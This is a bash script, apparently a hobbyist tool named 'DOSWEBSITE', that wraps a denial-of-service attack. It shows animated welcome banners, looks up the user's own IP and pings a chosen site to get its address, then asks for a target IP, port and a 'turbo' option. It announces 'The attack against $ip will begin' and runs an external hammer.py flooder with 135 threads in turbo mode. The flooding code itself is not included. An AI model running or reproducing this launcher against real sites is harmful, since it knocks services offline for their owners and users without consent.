	# ANIMATION

clear
sleep 0.2

for i in  `seq 1 7`;
	do

	clear
	echo -e "\033[34m######################################################################"
	echo -e "\033[34m####################### \033[32mBIENVENUE SUR            \033[34m#####################"
	echo -e "\033[34m######################################################################"
	sleep 0.2
	
	clear
	echo -e "\033[34m######################################################################"
	echo -e "\033[34m####################### \033[32mBIENVENUE SUR DOSWEBSITE \033[34m#####################"
	echo -e "\033[34m######################################################################"
	sleep 0.2
	
	done

sleep 0.5

echo -e "\033[0m                                             Made by Thomasfru, France      "

echo -e "\v"
echo ""

sleep 0.4

echo -e "\033[31mStarting..."
sleep 1.5

	# DEBUT


while [ -z $yourip ] || [[ $yourip != 'n' && $yourip != 'y' ]]
	do
		echo -e "\033[0m"
		read -p 'Do you want to see your Ip for testing? (y/n): ' yourip
		echo -e "\a"	
	done


if [ $yourip = "y" ] 
	then

	echo "################################################"
	wget -q www.monip.org -O -  | iconv -f iso8859-1 -t utf8 | sed -nre 's/^.* (([0-9]{1,3}\.){3}[0-9]{1,3}).*$/\1/p'
	echo ""
	echo "################################################"


fi	


while [ -z $ipaddr ] || [[ $ipaddr  != 'y' && $ipaddr  != 'n' ]]
	do
		echo -e "\033[0m"
		read -p 'Do you want to use ping service for target ip? (y/n): ' ipaddr
		echo -e "\a"	
	done

if [ $ipaddr = "y" ] 
	then

	echo "################################################"
	read -p 'Target address wich you want ip: ' turl
	echo "################################################"
	echo ""
	ping $turl -c 1
	echo ""
	sleep 0.5
	echo -e "\033[31mYou have your ip, so copy it\033[0m"

fi

echo ""
sleep 0.35

while [ -z $ip ]
	do
		echo ""
		echo -e "\033[35m################################################"
		read -p 'Target Ip: ' ip
		echo -e "\033[35m################################################"
		echo -e "\a"	
	done




sleep 0.2


while [ -z $port ]
	do
		echo -e "\033[36m################################################"
		read -p 'Port used: ' port
		echo -e "\033[36m################################################"
		echo -e "\a"
	
	done


sleep 0.2

 while [ -z $turbo ] || [[ $turbo != 'n' && $turbo != 'y' ]] 
	do 
		
		echo -e "\033[33m################################################"
		read -p 'Do you want to use turbo? (y/n) : ' turbo
		echo -e "\033[33m################################################"
		echo -e "\a"	
	done


sleep 0.7
echo -e "\v"
echo -e "\033[37mPress CTRL+C to cancel"
echo ""

sleep 0.7

echo -e "\033[31m****************************************************************"
echo "* The attack against $ip will begin...                *"
echo "* Port $port used                                                 *"
if [ $turbo = "y" ]
then
        echo "* Turbo enabled                                                *"

else 
	echo "* Turbo disabled                                               *"

fi
echo "*            _____        _____           __                   *"
echo "*           /    /       /    /           \ \                  *"
echo "*           / -  /       / -  /           _\_\                 *"
echo "*           _____        _____            \ \                  *"
echo "*                                          \_\                 *"
echo "*                                                              *"
echo "*               ____________                                   *"
echo "*               \__________/                                   *"
echo "*                                                              *"
echo "****************************************************************"
echo -e "\v"                                                             

sleep 5

echo -e "\033[0m                                                \033[41m Go! \033[0m"
echo ""

	#Attaque

sleep 1

cd Hammer/

if [ $turbo = "y" ]
then
 
./hammer.py -s $ip -p $port -t 135

else 

./hammer.py -s $ip -p $port

fi
